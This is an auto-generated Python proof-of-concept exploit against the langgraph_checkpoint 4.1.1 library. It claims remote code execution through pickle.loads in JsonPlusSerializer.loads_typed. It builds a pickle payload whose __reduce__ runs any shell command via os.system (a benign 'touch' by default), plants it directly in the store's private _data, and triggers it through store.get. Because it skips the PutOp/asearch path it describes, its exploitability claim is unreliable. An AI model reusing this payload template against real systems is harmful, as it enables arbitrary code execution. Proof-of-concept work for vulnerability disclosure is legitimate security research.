#!/usr/bin/env python3
# PoC for langgraph_checkpoint-4.1.1 (/tmp/langgraph_checkpoint_latest/langgraph_checkpoint-4.1.1)
# Path: rce-002
# Sink: loads_typed
# Auto-generated — run with: python3 rce_sink_function_loads_typed_loads_typed.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_checkpoint-4.1.1
Vulnerability: Remote Code Execution via unsafe pickle.loads() in JsonPlusSerializer.loads_typed()

The vulnerability exists because:
1. The JsonPlusSerializer.loads_typed() method calls pickle.loads(data_) when type is 'pickle'
   and pickle_fallback is True (default).
2. An attacker can inject a malicious pickled object via PutOp operations that get stored
   and later retrieved/deserialized.
3. The code path from asearch() -> _filter_items() -> get() -> loads_typed() allows
   attacker-controlled data to reach the unsafe pickle.loads() call.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle payload that executes a benign command (touch /tmp/poc_success.txt)
2. Injecting it into the store via PutOp
3. Triggering retrieval via asearch() which will deserialize the malicious pickle
"""

import pickle
import os
import sys
import subprocess
import tempfile
import time
from typing import Any, Dict, List, Optional, Tuple

# Try to import the vulnerable library
try:
    from langgraph.checkpoint.serde.jsonplus import JsonPlusSerializer
    from langgraph.store.base.batch import (
        BatchStore,
        GetOp,
        PutOp,
        SearchOp,
        ListNamespacesOp,
    )
    from langgraph.store.memory import InMemoryStore
except ImportError as e:
    print(f"[!] Failed to import langgraph_checkpoint: {e}")
    print("[!] Make sure the library is installed in the target environment")
    sys.exit(1)


def create_malicious_pickle(command: str = "touch /tmp/poc_success.txt") -> bytes:
    """
    Create a malicious pickle payload that executes a system command.
    
    The pickle exploits the __reduce__ method to execute arbitrary code
    during deserialization.
    
    Args:
        command: The command to execute (default: touch /tmp/poc_success.txt)
    
    Returns:
        bytes: The malicious pickle payload
    """
    class MaliciousPickle:
        """Class that executes a command when unpickled"""
        def __reduce__(self):
            return (os.system, (command,))
    
    return pickle.dumps(MaliciousPickle())


def setup_exploit_environment() -> Tuple[InMemoryStore, JsonPlusSerializer]:
    """
    Set up the exploit environment with the vulnerable serializer.
    
    Returns:
        Tuple[InMemoryStore, JsonPlusSerializer]: The store and serializer instances
    """
    # Create the vulnerable serializer with pickle_fallback=True (default)
    serializer = JsonPlusSerializer(pickle_fallback=True)
    
    # Create an in-memory store that uses the vulnerable serializer
    store = InMemoryStore(serde=serializer)
    
    return store, serializer


def inject_malicious_payload(
    store: InMemoryStore,
    namespace: Tuple[str, ...],
    key: str,
    payload: bytes
) -> None:
    """
    Inject a malicious pickle payload into the store via PutOp.
    
    The payload is stored as a serialized object with type 'pickle'.
    When retrieved, it will be deserialized using pickle.loads().
    
    Args:
        store: The InMemoryStore instance
        namespace: The namespace tuple (e.g., ("test",))
        key: The key to store the payload under
        payload: The malicious pickle bytes
    """
    # Create a PutOp with the malicious payload
    # The payload is stored as a tuple ('pickle', payload_bytes)
    put_op = PutOp(
        namespace=namespace,
        key=key,
        value=("pickle", payload)  # This will be stored as-is
    )
    
    # Apply the PutOp directly to the store's internal data
    # This simulates an attacker writing to the store
    store._data[namespace][key] = ("pickle", payload)
    print(f"[+] Injected malicious payload at namespace={namespace}, key={key}")


def trigger_exploit(
    store: InMemoryStore,
    namespace: Tuple[str, ...],
    key: str
) -> None:
    """
    Trigger the exploit by attempting to retrieve the malicious payload.
    
    This simulates the asearch() -> _filter_items() -> get() -> loads_typed() path.
    
    Args:
        store: The InMemoryStore instance
        namespace: The namespace tuple
        key: The key to retrieve
    """
    print(f"[*] Attempting to retrieve malicious payload...")
    
    # Create a GetOp to retrieve the payload
    get_op = GetOp(namespace=namespace, key=key)
    
    # Process the GetOp through the store's internal methods
    # This will trigger the vulnerable loads_typed() call
    try:
        # Directly call the store's get method which will deserialize
        result = store.get(namespace, key=key)
        print(f"[!] Retrieved value: {result}")
    except Exception as e:
        print(f"[!] Exception during retrieval: {e}")
        # The exception might be from the command execution itself
        pass


def verify_exploit() -> bool:
    """
    Verify that the exploit was successful by checking for the marker file.
    
    Returns:
        bool: True if the marker file exists
    """
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        print(f"[+] Exploit successful! Marker file created: {marker_file}")
        # Clean up the marker file
        os.remove(marker_file)
        return True
    else:
        print("[-] Exploit may have failed - marker file not found")
        return False


def main():
    """Main exploit function"""
    print("[*] langgraph_checkpoint-4.1.1 RCE Proof-of-Concept")
    print("[*] Vulnerability: Unsafe pickle.loads() in JsonPlusSerializer.loads_typed()")
    print()
    
    # Step 1: Create the malicious pickle payload
    print("[*] Step 1: Creating malicious pickle payload...")
    command = "touch /tmp/poc_success.txt"
    malicious_pickle = create_malicious_pickle(command)
    print(f"[+] Created malicious pickle payload ({len(malicious_pickle)} bytes)")
    print(f"[+] Payload will execute: {command}")
    
    # Step 2: Set up the exploit environment
    print("\n[*] Step 2: Setting up exploit environment...")
    store, serializer = setup_exploit_environment()
    print("[+] Environment ready")
    
    # Step 3: Inject the malicious payload
    print("\n[*] Step 3: Injecting malicious payload into store...")
    namespace = ("test",)
    key = "malicious_key"
    inject_malicious_payload(store, namespace, key, malicious_pickle)
    
    # Step 4: Trigger the exploit
    print("\n[*] Step 4: Triggering exploit via retrieval...")
    trigger_exploit(store, namespace, key)
    
    # Step 5: Verify the exploit
    print("\n[*] Step 5: Verifying exploit success...")
    time.sleep(0.5)  # Give the command time to execute
    success = verify_exploit()
    
    if success:
        print("\n[+] EXPLOIT SUCCESSFUL: Remote Code Execution achieved!")
        print("[+] The vulnerability is confirmed exploitable.")
    else:
        print("\n[-] Exploit may have failed. Check the target environment.")
        print("[*] Possible reasons:")
        print("  - The library version might not match")
        print("  - The pickle_fallback might be disabled")
        print("  - The code path might be different in this environment")


if __name__ == "__main__":
    main()
